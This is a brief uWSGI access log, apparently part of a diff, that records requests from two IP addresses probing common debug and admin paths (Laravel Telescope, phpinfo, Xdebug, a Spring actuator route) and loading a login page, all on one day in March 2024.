+[pid: 733|app: 0|req: 53/576] 35.216.250.151 () {36 vars in 524 bytes} [Sun Mar 24 09:34:55 2024] GET /telescope/requests => generated 0 bytes in 2 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 729|app: 0|req: 39/577] 35.216.250.151 () {36 vars in 504 bytes} [Sun Mar 24 09:34:56 2024] GET /info.php => generated 0 bytes in 5 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 166/578] 83.97.73.245 () {36 vars in 566 bytes} [Sun Mar 24 09:43:41 2024] GET /?XDEBUG_SESSION_START=phpstorm => generated 0 bytes in 15 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 732|app: 0|req: 167/579] 83.97.73.245 () {38 vars in 593 bytes} [Sun Mar 24 09:43:42 2024] GET /log-in/ => generated 3719 bytes in 9 msecs (HTTP/1.1 200) 8 headers in 358 bytes (1 switches on core 0)
+[pid: 726|app: 0|req: 69/580] 83.97.73.245 () {36 vars in 553 bytes} [Sun Mar 24 11:04:48 2024] GET /actuator/gateway/routes => generated 0 bytes in 7 msecs (HTTP/1.1 302) 8 headers in 242 bytes (1 switches on core 0)
+[pid: 727|app: 0|req: 33/581] 83.97.73.245 () {38 vars in 586 bytes} [Sun Mar 24 11:04:50 2024] GET /log-in/ => generated 3719 bytes in 15 msecs (HTTP/1.1 200) 8 headers in 358 bytes (2 switches on core 0)
